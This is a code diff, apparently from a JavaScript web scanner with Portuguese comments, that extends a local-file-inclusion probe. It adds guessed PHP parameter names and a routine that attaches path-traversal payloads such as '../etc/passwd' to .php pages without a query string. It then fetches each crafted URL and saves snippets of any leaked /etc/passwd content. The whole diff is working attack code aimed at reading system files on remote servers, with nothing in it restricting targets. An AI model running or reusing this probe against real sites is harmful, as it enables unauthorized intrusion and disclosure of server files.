@@ -1,6 +1,22 @@
 import { curlWebSingle } from './web-curl-single.js';
 
 const SUSPECT_PARAM_RE = /^(file|filepath|path|page|include|inc|template|view|doc|folder|root|lang|style|module|load|download|dir)$/i;
+
+/** Parâmetros típicos em PHP quando a página não expõe ? na URL inicial (LFI por adição de query). */
+const PHP_INJECT_PARAM_NAMES = [
+  'file',
+  'page',
+  'path',
+  'include',
+  'doc',
+  'view',
+  'p',
+  'f',
+  'pagina',
+  'folder',
+  'load',
+  'inc',
+];
 const PASSWD_PAYLOADS = [
   '/etc/passwd',
   '../etc/passwd',
@@ -42,6 +58,30 @@ function uniqueQueryUrls(urls) {
       if (seen.has(k)) continue;
       seen.add(k);
       out.push(x.href);
+    } catch {
+      /* ignore */
+    }
+  }
+  return out;
+}
+
+/**
+ * Páginas .php sem query string — candidatas a LFI ao acrescentar ?nome=../../../../etc/passwd
+ */
+function collectPhpUrlsWithoutQuery(urls) {
+  const out = [];
+  const seen = new Set();
+  for (const raw of urls || []) {
+    try {
+      const u = new URL(String(raw || ''));
+      u.hash = '';
+      if ([...u.searchParams.keys()].length > 0) continue;
+      const path = u.pathname || '';
+      if (!/\.php$/i.test(path)) continue;
+      const k = `${u.origin}${u.pathname}`;
+      if (seen.has(k)) continue;
+      seen.add(k);
+      out.push(u.href);
     } catch {
       /* ignore */
     }
@@ -96,6 +136,56 @@ export async function runLfiPasswdProbe({
             evidence: 'assinatura /etc/passwd no corpo',
             snippet: String(r.bodyText).slice(0, 200).replace(/\s+/g, ' ').trim(),
           });
+          break;
+        } catch {
+          /* ignore network errors */
+        }
+      }
+    }
+  }
+
+  // URLs terminadas em .php sem ? — injeta ?param=traversal+/etc/passwd
+  const phpBases = collectPhpUrlsWithoutQuery(urls).slice(0, 12);
+  if (phpBases.length) {
+    logger(
+      `[lfi] .php sem query: ${phpBases.length} URL(s) — a tentar ?${PHP_INJECT_PARAM_NAMES.slice(0, 4).join('|')}=…/etc/passwd`,
+      'info',
+    );
+  }
+  for (const baseHref of phpBases) {
+    if (attempts >= maxAttempts) break;
+    let u;
+    try {
+      u = new URL(baseHref);
+    } catch {
+      continue;
+    }
+    let hitThisPhp = false;
+    for (const paramName of PHP_INJECT_PARAM_NAMES) {
+      if (attempts >= maxAttempts || hitThisPhp) break;
+      for (const payload of PASSWD_PAYLOADS) {
+        if (attempts >= maxAttempts) break;
+        attempts += 1;
+        const test = new URL(u.href);
+        test.searchParams.set(paramName, payload);
+        const testUrl = test.href;
+        try {
+          logger(`[lfi] .php+query inventada: ${testUrl}`, 'info');
+          const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
+          if (!r || !r.bodyText) continue;
+          if (!looksLikePasswdDump(r.bodyText)) continue;
+
+          results.push({
+            ok: true,
+            baseUrl: u.href,
+            testUrl,
+            param: paramName,
+            payload,
+            status: Number(r.status) || 0,
+            evidence: 'assinatura /etc/passwd no corpo (URL .php sem ? + param inject)',
+            snippet: String(r.bodyText).slice(0, 200).replace(/\s+/g, ' ').trim(),
+          });
+          hitThisPhp = true;
           break;
         } catch {
           /* ignore network errors */
